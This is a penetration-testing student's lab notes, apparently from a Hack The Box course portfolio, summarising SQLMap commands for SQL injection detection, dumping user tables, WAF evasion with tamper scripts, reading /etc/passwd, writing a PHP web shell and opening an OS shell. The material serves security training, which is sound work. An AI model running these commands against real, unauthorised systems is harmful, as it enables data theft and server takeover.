# 18 — SQLMap Essentials

> **Path Phase:** Web Attacks | **Difficulty:** Easy | **Sections:** 11

Automating SQL injection with SQLMap — detection, tuning, enumeration, WAF bypass, OS exploitation.

> ℹ️ `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. SQLMap Overview
2. Getting Started with SQLMap
3. SQLMap Output Description
4. Running SQLMap on an HTTP Request
5. Handling SQLMap Errors
6. Attack Tuning
7. Database Enumeration
8. Advanced Database Enumeration
9. Bypassing Web Application Protections
10. OS Exploitation
11. Skills Assessment

---

## 1–3 — Overview & Getting Started
```bash
sqlmap -u "http://{TARGET}/?id=1" --batch
# --batch auto-answers; shows injectable params + DBMS
```

## 4 — Running on an HTTP Request
```bash
# Save request from Burp → req.txt
sqlmap -r req.txt --batch
sqlmap -u "http://{TARGET}/login" --data="user=a&pass=b" --batch
sqlmap -u "http://{TARGET}/?id=1" --cookie="PHPSESSID=xxx" --batch
```

## 5 — Handling Errors
`--parse-errors`, `--proxy=http://127.0.0.1:8080` (to Burp), `-v 3` for verbose payloads.

## 6 — Attack Tuning
```bash
sqlmap -u "URL" --level=5 --risk=3 --batch
sqlmap -u "URL" --technique=U --batch
sqlmap -u "URL" -p id --dbms=mysql --batch
```

## 7 — Database Enumeration
```bash
sqlmap -u "URL" --dbs --batch
sqlmap -u "URL" -D dbname --tables --batch
sqlmap -u "URL" -D dbname -T users --columns --batch
sqlmap -u "URL" -D dbname -T users --dump --batch
sqlmap -u "URL" --current-user --current-db --is-dba --batch
```
> **Dumped data:** ✅ Completed in lab (withheld per HTB Academy policy)

## 8 — Advanced Enumeration
```bash
sqlmap -u "URL" --dump-all --batch
sqlmap -u "URL" -D db -T users -C username,password --dump --batch
sqlmap -u "URL" --schema --batch
```

## 9 — Bypassing WAF Protections
```bash
sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch
sqlmap -u "URL" --random-agent --batch
sqlmap --list-tampers
```

## 10 — OS Exploitation
```bash
sqlmap -u "URL" --file-read=/etc/passwd --batch
sqlmap -u "URL" --file-write=shell.php --file-dest=/var/www/html/shell.php --batch
sqlmap -u "URL" --os-shell --batch
sqlmap -u "URL" --sql-shell --batch
```
> **OS shell:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 11 — Skills Assessment
```bash
sqlmap -r req.txt --batch --level=5 --risk=3
sqlmap -r req.txt -D <db> -T <table> --dump --batch
sqlmap -r req.txt --tamper=space2comment --os-shell --batch
```
> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `sqlmap` | Automated SQLi detection & exploitation |
| Burp | Capturing requests for `-r` |
| Tamper scripts | WAF bypass |

## 🔑 Key Takeaways
- **`-r req.txt`** (Burp request) is the cleanest way to feed SQLMap.
- `--level`/`--risk` increase detection depth; `--technique` narrows it.
- `--os-shell` and `--file-write` turn SQLi into RCE.
- Tamper scripts (`--tamper`) bypass many WAFs.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
